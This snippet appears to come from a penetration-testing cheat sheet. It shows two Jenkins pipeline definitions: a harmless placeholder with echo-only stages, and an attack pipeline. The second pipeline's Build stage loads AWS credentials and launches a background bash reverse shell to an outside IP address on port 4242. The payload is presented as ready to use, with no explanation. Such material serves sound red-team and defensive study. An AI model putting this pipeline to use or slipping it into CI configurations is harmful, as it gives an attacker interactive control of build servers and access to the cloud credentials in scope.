### Default
```sh
pipeline {
    agent any   
    // TODO automate the building of this later
    stages {
        stage('Build') {
            steps {
                echo 'Building..'
            }
        }
        stage('Test') {
            steps {
                echo 'Testing..'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
            }
        }
    }
}
```

```sh
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
				sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
```